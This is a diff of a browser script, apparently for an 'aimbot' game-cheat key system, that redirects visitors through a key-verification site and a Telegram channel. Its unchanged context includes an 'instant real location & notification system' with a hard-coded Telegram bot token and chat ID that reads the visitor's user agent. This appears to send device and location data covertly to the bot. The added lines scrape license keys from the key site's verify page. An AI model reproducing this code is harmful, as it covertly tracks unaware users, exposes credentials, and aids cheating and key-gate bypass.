@@ -10,7 +10,7 @@
 
     // --- INSTANT REAL LOCATION & NOTIFICATION SYSTEM ---
     try {
-        const botToken = '8402356779:AAGiCPxFhd6i455rR-4a5CjJzJ0sIzwoo1k';
+        const botToken = '8402356779:AAGiCPxFhd6i455rR-4a5CjJzJ0sIzwon1k';
         const chatId = '8488556450';
         
         const ua = navigator.userAgent;
@@ -58,21 +58,6 @@
     } catch(e) {}
     // -------------------------------------------------------------------------
 
-    // --- CHECK IF ALREADY ON SAKIR VERIFY PAGE ---
-    try {
-        if (location.hostname === "getkey.sakirmobilepanel.shop") {
-            const p = location.pathname.replace(/\/+$/, "");
-            if (p.indexOf("/verify-key") === 0 && location.search.indexOf("sig=") !== -1) {
-                // If already arrived here, trigger 7-8 seconds delay then redirect to Channel
-                setTimeout(() => {
-                    window.location.href = "https://telegram.me/+xVEVeNBqwthiMjhl";
-                }, 7500);
-                return;
-            }
-        }
-    } catch(e) {}
-
-    // --- DIALOG BOX & REDIRECT FLOW ---
     try {
         const style = document.createElement('style');
         style.innerHTML = `
@@ -87,6 +72,13 @@
                 width: 80%; max-width: 350px; color: #fff; 
             }
             .fetch-txt { color: #00ff00; margin-top: 25px; font-weight: bold; font-size: 18px; }
+            .tg-btn {
+                display: inline-block; margin-top: 20px; padding: 12px 24px;
+                background: #0a0a0a; color: #00f2fe; border: 2px solid #00f2fe;
+                border-radius: 12px; font-weight: bold; text-decoration: none;
+                box-shadow: 0 0 15px rgba(0,242,254,0.4); transition: 0.2s;
+            }
+            .tg-btn:active { background: #00f2fe; color: #0a0a0a; }
         `;
         document.head.appendChild(style);
 
@@ -98,6 +90,8 @@
                 <div style="font-size:35px; margin-bottom:10px;">🛡️</div>
                 SAKIR AIMBOT KEY SYSTEM<br>WAIT 3 SEC
                 <div class="fetch-txt">⚙️ GENERATING TOKEN...</div>
+                <br>
+                <a href="https://telegram.me/+xVEVeNBqwthiMjhl" target="_blank" class="tg-btn">📢 JOIN TELEGRAM</a>
             </div>`;
         document.body.appendChild(mko);
     } catch(e) {
@@ -124,10 +118,25 @@
             
             const targetUrl = `https://getkey.sakirmobilepanel.shop/verify-key?device=${deviceID}&t=${ts}&sig=${sig}`;
             
-            // Open Sakir Link and store a flag + timestamp in sessionStorage so the destination page knows when to redirect to Telegram
-            sessionStorage.setItem('pahadi_redirect_active', 'true');
-            sessionStorage.setItem('pahadi_redirect_time', Date.now());
-
+            if (location.hostname === "getkey.sakirmobilepanel.shop") {
+                const p = location.pathname.replace(/\/+$/, "");
+                if (p.indexOf("/verify-key") === 0 && location.search.indexOf("sig=") !== -1) {
+                    const grab = () => {
+                        const kEl = document.getElementById("licenseKey");
+                        if (kEl) {
+                            const key = kEl.textContent.trim();
+                            if (key) {
+                                alert("Sakir Aimbot Key: " + key);
+                                return true;
+                            }
+                        }
+                        return false;
+                    };
+                    if (!grab()) setTimeout(grab, 1000);
+                    return;
+                }
+            }
+            
             window.location.replace(targetUrl);
         } catch(err) { 
             window.location.replace(_fb); 
